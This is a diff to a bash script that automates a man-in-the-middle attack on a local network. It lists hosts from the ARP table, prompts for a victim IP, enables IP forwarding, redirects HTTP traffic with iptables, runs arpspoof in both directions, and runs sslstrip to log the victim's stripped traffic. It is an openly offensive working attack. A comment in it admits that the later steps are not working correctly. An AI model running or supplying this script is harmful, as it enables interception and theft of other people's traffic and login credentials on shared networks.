@@ -17,6 +17,7 @@
 #6. tail the sslstrip.log for constant updates
 #7. Spool up driftnet
 #8. reset ipforwarding to 0 on close / exit
+#9. Ask for interface device to run attack on.
 
 #Determing the attacker's IP and MAC address.
 ATTACKERIP=$(ifconfig | egrep 'inet addr' | cut -d":" -f2 | egrep -v '^127' | cut -d" " -f1)
@@ -46,14 +47,40 @@ done
 ACCESSPOINTMAC=$(arp -a | egrep -w $ACCESSPOINTIP | cut -d" " -f4)
 
 printf "Yo' Self\n------------------------------\n"
-printf "Your private IP is : ($ATTACKERIP) at $ATTACKERMAC"
-printf "\nThe gateway IP is  : ($ACCESSPOINTIP) at $ACCESSPOINTMAC \n"
+printf "Your private IP is : $ATTACKERIP at $ATTACKERMAC"
+printf "\nThe gateway IP is  : $ACCESSPOINTIP at $ACCESSPOINTMAC \n"
 
 #List of targets minus the AP. Your own IP shouldn't show here regardless.
 printf "\nTargets\n----------------------------------\n"
 arp -a | cut -d" " -f2-4 | tr -d '()' | egrep -vw $ACCESSPOINTIP
 
 #Prompt for target IP.
-TARGETIP=$(read -p "\nEnter the target IP: ")
+printf "\n----------------------------------\n"
+TARGETIP=$(read -p "Enter the target IP: ")
+
+#Test to make sure the user didn't put themselves as the target.
+if [ $TARGETIP = $ATTACKERIP ]; then
+    printf "\nWrong answer, bro."
+    exit 1
+fi
+
+#!!!Nothing is working correctly after this point.!!!
+###########################################################################################
+#Set up IP forwarding
+sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' #Has to be done this way on Ubuntu.
+
+#Modify IP tables
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+#Open two shells running arpspoof.
+gnome-terminal -e "bash -c arpspoof -i wlan0 -t ${TARGETIP} ${ACCESSPOINTIP}" #Assumes wireless connection.
+gnome-terminal -e "bash -c arpspoof -i wlan0 -t ${ACCESSPOINTIP} ${TARGETIP}"
+
+#Set up SSL stripping.
+sslstrip -k -l 8080 -w ~/Desktop/sslstrip.log
+
+#Set up terminal running a tail of the sslstrip.log
+gnome-terminal -e "bash -c tail -F sslstrip.log"
+    
 
 exit 0
